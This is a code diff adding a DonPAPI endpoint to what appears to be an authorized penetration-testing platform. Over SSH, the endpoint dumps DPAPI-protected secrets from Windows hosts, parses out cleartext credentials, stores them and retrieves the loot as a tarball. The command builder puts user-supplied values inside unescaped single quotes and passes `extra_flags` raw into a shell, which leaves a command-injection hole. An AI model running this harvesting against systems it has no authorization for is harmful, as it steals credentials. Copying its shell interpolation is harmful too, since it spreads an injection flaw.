@@ -891,3 +891,282 @@ async def run_ffuf(
         "paths_found": paths_found,
         "findings_created": findings_created,
     }
+
+
+# ── DonPAPI ───────────────────────────────────────────────────────────
+#
+# DonPAPI dumps DPAPI-protected secrets (vaults / Wi-Fi profiles / browser
+# saved logins / certs / masterkeys) from Windows hosts. Runs from the
+# attacker box with domain credentials. Outputs a SQLite DB plus per-victim
+# directories under -o <output_dir>.
+#
+# We invoke it with a per-job output directory, parse stdout for newly
+# discovered cleartext credentials, fetch the output dir as a tarball Loot,
+# and record a HostActivity entry on the target host.
+
+
+class DonpapiScanBody(BaseModel):
+    target: str               # IP or comma-list
+    domain: str = ""
+    username: str = ""
+    password: str = ""
+    nthash: str = ""
+    extra_flags: str = ""
+    target_id: Optional[str] = None
+    timeout_seconds: int = 600
+    fetch_loot: bool = True
+
+
+# Parses the human-readable stdout banner of donpapi >=2.x for cleartext
+# entries. Format roughly looks like:
+#   [+] Found credential on 10.0.0.5
+#       URL: https://login.example.com
+#       Login: alice@example.com
+#       Password: P@ssw0rd!
+#
+# We pick out the trio of URL/Login/Password (and Wifi SSID/password)
+# blocks. Non-cleartext blobs (cert, masterkey hashes) are skipped — they
+# go into the Loot tarball instead.
+_DONPAPI_BLOCK_RE = re.compile(
+    r"(?P<kind>Found credential|Found WiFi|WiFi profile|Found cookie|Cookie)\s+on\s+(?P<host>[^\s\n]+)?",
+    re.IGNORECASE,
+)
+_DONPAPI_KV_RE = re.compile(r"^\s+(URL|Login|Password|Username|SSID|Wifi|Domain)\s*[:=]\s*(.+)$", re.IGNORECASE | re.MULTILINE)
+
+
+def _parse_donpapi_stdout(text: str) -> list[dict]:
+    """Best-effort parser for donpapi stdout — returns list of cred dicts."""
+    creds = []
+    # Split into "blocks" — each starts with a "Found credential ..." line
+    parts = re.split(r"^(?=\s*\[\+\]\s*Found\s)", text or "", flags=re.IGNORECASE | re.MULTILINE)
+    for part in parts:
+        block_match = _DONPAPI_BLOCK_RE.search(part)
+        if not block_match:
+            continue
+        kv: dict[str, str] = {}
+        for k, v in _DONPAPI_KV_RE.findall(part):
+            kv[k.strip().lower()] = v.strip()
+        username = kv.get("login") or kv.get("username") or ""
+        password = kv.get("password") or ""
+        if not username or not password:
+            continue
+        creds.append({
+            "username": username,
+            "secret": password,
+            "domain": kv.get("domain") or "",
+            "service": (kv.get("url") or kv.get("ssid") or kv.get("wifi") or "donpapi"),
+            "kind": block_match.group("kind").lower(),
+            "host_hint": block_match.group("host") or "",
+        })
+    return creds
+
+
+def _donpapi_build_command(target: str, domain: str, username: str, password: str,
+                          nthash: str, extra_flags: str, output_dir: str) -> str:
+    """Compose the donpapi CLI invocation. Hash takes precedence over password."""
+    auth = ""
+    if nthash:
+        auth = f"-H '{nthash}'"
+    elif password:
+        auth = f"-p '{password}'"
+    user_arg = f"-u '{username}'" if username else ""
+    dom_arg = f"-d '{domain}'" if domain else ""
+    return (
+        f"mkdir -p '{output_dir}' && donpapi collect "
+        f"-t '{target}' {user_arg} {dom_arg} {auth} "
+        f"--output-directory '{output_dir}' {extra_flags} 2>&1 ; "
+        f"ls -la '{output_dir}' 2>/dev/null"
+    )
+
+
+@router.post("/donpapi")
+async def run_donpapi_scan(
+    pid: str,
+    body: DonpapiScanBody,
+    request: Request,
+    db: Session = Depends(get_db),
+    user: models.User = Depends(get_current_user),
+):
+    _require_attacker_ssh()
+    check_pid_access(db, pid, user, "credentials.create")
+
+    if not body.target.strip():
+        raise HTTPException(400, "target is required")
+    if not body.username:
+        raise HTTPException(400, "username is required for DPAPI dump")
+    if not (body.password or body.nthash):
+        raise HTTPException(400, "password or nthash is required")
+
+    ssh_config = _get_ssh_config(pid, body.target_id, db, body.target.strip())
+
+    output_dir = f"/tmp/donpapi_{int(datetime.utcnow().timestamp())}"
+    raw_cmd = _donpapi_build_command(
+        body.target.strip(), body.domain, body.username,
+        body.password, body.nthash, body.extra_flags, output_dir,
+    )
+
+    # Scrub the secret out of the stored command so downstream audit /
+    # WS broadcast doesn't carry it (P12 hygiene rule from v0.4.6).
+    from ..core.secret_scrub import scrub_secret
+    safe_cmd = scrub_secret(scrub_secret(raw_cmd, body.password), body.nthash)
+
+    username = getattr(request.state, "username", None)
+    target = body.target.strip()
+    job = start_job(
+        db, pid, "donpapi", f"DonPAPI: {target}",
+        target=target, command=safe_cmd, created_by=username or "",
+        connector_key="donpapi", operation="scan",
+        related_entity_type="project", related_entity_id=pid,
+        request_json={
+            "target": target, "domain": body.domain, "username": body.username,
+            "target_id": body.target_id, "timeout_seconds": body.timeout_seconds,
+            "fetch_loot": body.fetch_loot, "output_dir": output_dir,
+            # password / nthash deliberately NOT echoed back in request_json
+        },
+    )
+
+    loop = asyncio.get_running_loop()
+    result = await loop.run_in_executor(
+        None, lambda: run_ssh_command(ssh_config, raw_cmd, body.timeout_seconds)
+    )
+
+    stdout = result.get("stdout", "") or ""
+    stderr = result.get("stderr", "") or ""
+    combined = stdout + ("\n" + stderr if stderr else "")
+    safe_output = scrub_secret(scrub_secret(combined, body.password), body.nthash)
+
+    parsed = _parse_donpapi_stdout(combined)
+
+    # Auto-create Cred rows for the harvested credentials.
+    from ..core.crypto import encrypt_str
+    creds_created = 0
+    for cred in parsed:
+        # Dedup against existing cred for this project + username + domain + host
+        existing = db.query(models.Cred).filter(
+            models.Cred.pid == pid,
+            models.Cred.username == cred["username"],
+            models.Cred.domain == (cred.get("domain") or ""),
+            models.Cred.service == cred["service"],
+        ).first()
+        if existing:
+            continue
+        new_cred = models.Cred(
+            id=new_id("c"),
+            pid=pid,
+            username=cred["username"],
+            secret=encrypt_str(cred["secret"]),
+            type="plain",
+            service=cred["service"],
+            domain=cred.get("domain") or "",
+            host=cred.get("host_hint") or target,
+            tags=["donpapi", cred.get("kind") or ""],
+        )
+        db.add(new_cred)
+        creds_created += 1
+
+    # Try to attach a HostActivity to the targeted host if it exists.
+    target_host = db.query(models.Host).filter(
+        models.Host.pid == pid, models.Host.ip == target
+    ).first()
+    activity_id = ""
+    if target_host:
+        ts = ts_now()
+        activity = models.HostActivity(
+            id=new_id("ha"),
+            pid=pid,
+            host_id=target_host.id,
+            title=f"DonPAPI: {target}",
+            activity_type="credential_dump",
+            command=safe_cmd,
+            summary=f"DonPAPI dump → {creds_created} cred(s) harvested",
+            output=safe_output[:20000],
+            status="done" if result.get("ok") else "failed",
+            ts=ts,
+        )
+        db.add(activity)
+        db.flush()
+        activity_id = activity.id
+
+    # Auto-loot: tar the output dir on the attacker box, base64 it back
+    # over the existing SSH channel, save as a Loot file. Skipped on failed
+    # run or when the operator opted out. Best-effort — loot failure must
+    # not roll back the whole credential harvest.
+    loot_id = ""
+    if body.fetch_loot and result.get("ok"):
+        try:
+            from ..core.config import UPLOAD_ROOT
+            from pathlib import Path as _Path
+            import base64 as _b64
+
+            fetch_cmd = (
+                f"tar -czf - -C \"$(dirname '{output_dir}')\" "
+                f"\"$(basename '{output_dir}')\" 2>/dev/null | base64 -w 0"
+            )
+            fetch_result = await loop.run_in_executor(
+                None, lambda: run_ssh_command(ssh_config, fetch_cmd, 120)
+            )
+            b64_payload = (fetch_result.get("stdout") or "").strip()
+            if b64_payload:
+                try:
+                    tar_bytes = _b64.b64decode(b64_payload)
+                except Exception:
+                    tar_bytes = b""
+                MAX_LOOT = 50 * 1024 * 1024
+                if 0 < len(tar_bytes) <= MAX_LOOT:
+                    loot_id = new_id("lt")
+                    loot_dir = UPLOAD_ROOT / pid / "loot"
+                    loot_dir.mkdir(parents=True, exist_ok=True)
+                    safe_target = target.replace('/', '_').replace(':', '_')
+                    filename = f"donpapi_{safe_target}.tar.gz"
+                    disk_path = _Path(loot_dir) / f"{loot_id}.tar.gz"
+                    disk_path.write_bytes(tar_bytes)
+                    loot = models.Loot(
+                        id=loot_id,
+                        pid=pid,
+                        host_id=target_host.id if target_host else None,
+                        loot_type="file",
+                        value=filename,
+                        description=f"DonPAPI dump artefacts from {target} ({len(tar_bytes)} bytes, {creds_created} cred(s))",
+                        source_path=f"/api/uploads/{pid}/loot/{loot_id}.tar.gz",
+                        filename=filename,
+                        content_type="application/gzip",
+                        file_size=len(tar_bytes),
+                        storage_path=str(disk_path),
+                        public_url=f"/api/uploads/{pid}/loot/{loot_id}.tar.gz",
+                        ts=ts_now(),
+                        job_id=job.id,
+                    )
+                    db.add(loot)
+                    db.flush()
+                    bcast(pid, "loot", "create", schemas.Loot.model_validate(loot).model_dump())
+        except Exception as e:
+            log_event(db, pid, username, "scan", "donpapi_loot_failed",
+                      f"DonPAPI loot fetch failed: {e}",
+                      {"target": target, "error": str(e)[:200]})
+
+    log_event(
+        db, pid, username, "scan", "donpapi",
+        f"DonPAPI on {target}: {creds_created} cred(s)",
+        {"target": target, "creds_created": creds_created, "output_dir": output_dir, "loot_id": loot_id},
+    )
+    db.commit()
+
+    finish_job(
+        db, job,
+        status="done" if result.get("ok") else "failed",
+        output=safe_output[:20000],
+        error_output=scrub_secret(stderr, body.password),
+        result={
+            "creds_created": creds_created, "output_dir": output_dir,
+            "activity_id": activity_id, "loot_id": loot_id,
+        },
+    )
+
+    return {
+        "ok": result.get("ok", False),
+        "job_id": job.id,
+        "target": target,
+        "creds_created": creds_created,
+        "output_dir": output_dir,
+        "loot_id": loot_id,
+    }
